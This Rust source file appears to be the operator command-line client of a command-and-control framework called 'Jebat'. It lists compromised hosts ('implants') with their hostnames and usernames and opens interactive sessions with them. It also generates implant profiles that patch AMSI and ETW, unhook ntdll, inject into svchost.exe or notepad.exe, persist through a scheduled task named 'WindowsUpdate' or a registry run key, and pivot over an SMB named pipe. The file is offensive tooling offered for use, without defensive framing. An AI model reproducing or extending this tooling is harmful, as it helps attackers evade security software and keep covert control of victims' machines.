mod client;
mod repl;

use clap::{Parser, Subcommand};

#[derive(Parser)]
#[command(name = "jebat-cli", about = "Jebat C2 Operator CLI")]
struct Cli {
    #[arg(short, long, default_value = "http://127.0.0.1:9090")]
    server: String,

    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Start interactive REPL
    Shell,
    /// List all implants
    Implants,
    /// Interact with a specific implant
    Interact {
        #[arg(help = "Agent ID (hex, first 8+ chars)")]
        agent_id: String,
    },
    /// Generate implant config
    Build {
        #[arg(short, long, default_value = "stealth")]
        profile: String,
        #[arg(short, long)]
        output: Option<String>,
    },
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    let api = client::ApiClient::new(&cli.server);

    match cli.command {
        Some(Commands::Implants) => {
            match api.list_implants().await {
                Ok(implants) => {
                    println!(
                        "{:<18} {:<16} {:<12} {:<8} {:<10}",
                        "AGENT ID", "HOSTNAME", "USERNAME", "SLEEP", "STATUS"
                    );
                    println!("{}", "-".repeat(66));
                    for imp in &implants {
                        println!(
                            "{:<18} {:<16} {:<12} {:<8} {:<10}",
                            &imp.agent_id[..16.min(imp.agent_id.len())],
                            imp.hostname,
                            imp.username,
                            format!("{}s", imp.sleep_ms / 1000),
                            imp.status,
                        );
                    }
                    println!("\n{} implant(s)", implants.len());
                }
                Err(e) => eprintln!("error: {}", e),
            }
        }
        Some(Commands::Interact { agent_id }) => {
            repl::interact_loop(&api, &agent_id).await;
        }
        Some(Commands::Build { profile, output }) => {
            let config = generate_profile(&profile);
            if let Some(path) = output {
                std::fs::write(&path, &config).unwrap_or_else(|e| {
                    eprintln!("write error: {}", e);
                });
                println!("config written to {}", path);
            } else {
                println!("{}", config);
            }
        }
        Some(Commands::Shell) | None => {
            repl::main_loop(&api).await;
        }
    }
}

fn generate_profile(profile: &str) -> String {
    match profile {
        "stealth" => {
            r#"[implant]
sleep_ms = 60000
jitter_pct = 40
protocol = "https"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

[evasion]
unhook_ntdll = true
patch_amsi = true
patch_etw = true
syscall_mode = "indirect"

[inject]
method = "apc_queue"
target = "svchost.exe"

[persist]
method = "scheduled_task"
name = "WindowsUpdate"

[comms]
beacon_path = "/beacon"
result_path = "/result"
"#
            .to_string()
        }
        "noisy" => {
            r#"[implant]
sleep_ms = 5000
jitter_pct = 10
protocol = "https"
user_agent = "JebatAgent/1.0"

[evasion]
unhook_ntdll = false
patch_amsi = true
patch_etw = false
syscall_mode = "direct"

[inject]
method = "create_remote_thread"
target = "notepad.exe"

[persist]
method = "registry_run"
name = "Updater"

[comms]
beacon_path = "/beacon"
result_path = "/result"
"#
            .to_string()
        }
        "pivot" => {
            r#"[implant]
sleep_ms = 15000
jitter_pct = 25
protocol = "smb"

[evasion]
unhook_ntdll = true
patch_amsi = true
patch_etw = true
syscall_mode = "indirect"

[inject]
method = "apc_queue"
target = "svchost.exe"

[persist]
method = "none"

[comms]
pipe_name = "\\.\pipe\jebat"
"#
            .to_string()
        }
        _ => {
            format!("# Unknown profile: {}\n# Available: stealth, noisy, pivot\n", profile)
        }
    }
}
